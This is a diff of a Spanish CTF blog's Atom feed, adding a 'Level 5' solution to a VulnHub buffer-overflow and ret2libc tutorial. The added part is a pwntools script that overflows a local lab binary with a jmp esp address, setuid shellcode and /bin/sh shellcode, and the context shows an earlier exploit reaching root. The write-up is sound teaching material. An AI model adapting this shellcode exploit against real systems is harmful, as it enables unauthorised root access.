@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-03T20:30:54-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-06T16:21:24-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
 </subtitle><author><name>MiguelRega7</name></author><entry><title type="html">Buffer Overflow For Beginners and Ret2libc</title><link href="http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html" rel="alternate" type="text/html" title="Buffer Overflow For Beginners and Ret2libc" /><published>2024-05-03T00:00:00-06:00</published><updated>2024-05-03T00:00:00-06:00</updated><id>http://localhost:4000/vulnhub/machines/2024/05/03/buffer</id><content type="html" xml:base="http://localhost:4000/vulnhub/machines/2024/05/03/buffer.html"><![CDATA[<p align="center">
 <img src="/assets/vulnhub/buff/icon.png" />
 </p>
@@ -732,6 +732,33 @@ print<span class="o">(</span>junk + addr_system + addr_exit + addr_bin_sh<span c
 Buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAp�0���
 <span class="c"># whoami</span>
 root
+</code></pre></div></div>
+
+<h2 id="level-5">Level 5</h2>
+
+<ul>
+  <li>Gracias a xchg2pwn por la aportación <a href="https://xchg2pwn.github.io">https://xchg2pwn.github.io</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python2</span>
+from pwn import process, p32
+
+shell <span class="o">=</span> process<span class="o">(</span><span class="s2">"./levelFive"</span><span class="o">)</span>
+
+offset <span class="o">=</span> 16
+junk <span class="o">=</span> b<span class="s2">"A"</span> <span class="k">*</span> offset
+
+jmpesp <span class="o">=</span> p32<span class="o">(</span>0xf7dd4ff7<span class="o">)</span>
+
+setuid <span class="o">=</span> b<span class="s2">"1</span><span class="se">\x</span><span class="s2">dbj</span><span class="se">\x</span><span class="s2">17X</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+
+shellcode  <span class="o">=</span> b<span class="s2">""</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f"</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69"</span>
+shellcode +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+
+shell.sendline<span class="o">(</span>junk + jmpesp + setuid + shellcode<span class="o">)</span>
+shell.interactive<span class="o">()</span>
 </code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="vulnhub/machines" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Scrambled (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html" rel="alternate" type="text/html" title="HackTheBox - Scrambled (medium)" /><published>2024-04-30T00:00:00-06:00</published><updated>2024-04-30T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/04/30/scrambled.html"><![CDATA[<p align="center">
 <img src="https://labs.hackthebox.com/storage/avatars/6a88f8059e46c1d5652c3c15ac2cb9f3.png" />
 </p>
